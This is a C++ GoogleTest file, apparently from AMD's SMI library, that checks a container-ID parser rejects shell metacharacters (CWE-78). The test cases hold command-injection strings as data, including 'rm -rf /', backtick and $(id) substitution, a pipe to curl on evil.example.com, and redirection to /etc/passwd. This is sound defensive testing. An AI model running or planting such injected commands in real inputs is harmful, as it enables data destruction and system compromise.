/*
 * Copyright (c) Advanced Micro Devices, Inc. All rights reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

// CWE-78 OS Command Injection (shell-metacharacter smuggling).
//
// Threat: if container_name ever reaches system(), popen(), exec*() with
// shell interpolation, or a template that builds a shell command, a
// metacharacter in the ID turns identification into arbitrary execution.
// Even without an obvious shell path, values may be interpolated into
// scripts, makefiles, JSON-flattened shell commands, ssh-forwarded commands,
// or CI logs that tooling re-parses.
//
// Dangerous bytes in this context:
//
//   ; | & $ ` ( ) < > { } [ ] \ * ? ! # ~ ' " SPACE TAB NEWLINE
//
// CWE-78:  https://cwe.mitre.org/data/definitions/78.html
// CWE-77:  https://cwe.mitre.org/data/definitions/77.html  (argument injection)
//
// Landmark CVEs in this class:
//   - CVE-2014-6271  "Shellshock" — bash function parsing
//     https://nvd.nist.gov/vuln/detail/CVE-2014-6271
//   - CVE-2018-6789  Exim base64d() overflow + command injection
//     https://nvd.nist.gov/vuln/detail/CVE-2018-6789
//   - CVE-2024-3094  xz backdoor — unrelated transport but same lesson:
//     bytes that look like data become code at an unexpected boundary
//
// Parser defense: charset [a-zA-Z0-9_-] rejects every metachar above. This
// file pins the specific byte-level rejections — each test can be
// referenced in a security audit as "the PR has a concrete regression
// test for this byte".

#include <gtest/gtest.h>

#include <string>
#include <vector>

#include "container_id_test_util.h"

using amdsmi_test::ExtractIdString;

namespace {
struct ShellCase {
  std::string line;
  std::string expected;
  const char* desc;
};
}  // namespace

// Each metachar terminates the charset scan, so the ID is truncated at the
// first offending byte. type_name is "docker" for every case.
TEST(ContainerIdParser_ShellMetachars, RejectsMetacharAtFirstOccurrence) {
  const std::vector<ShellCase> cases = {
      {"0::/docker/abc;rm -rf /", "abc", "semicolon (CVE-2014-6271 Shellshock)"},
      {"0::/docker/abc`id`", "abc", "backtick command substitution"},
      {"0::/docker/abc$(id)", "abc", "dollar-paren command substitution"},
      {"0::/docker/abc|curl evil.example.com", "abc", "pipe"},
      {"0::/docker/abc&background", "abc", "ampersand background"},
      {"0::/docker/abc>/etc/passwd", "abc", "output redirection"},
      {"0::/docker/abc'injected'", "abc", "single quote"},
      {"0::/docker/abc\"injected\"", "abc", "double quote"},
      {"0::/docker/abc def", "abc", "space"},
  };
  for (const auto& c : cases) {
    EXPECT_EQ(ExtractIdString(c.line, "docker"), c.expected)
        << "metachar: " << c.desc;
  }
}
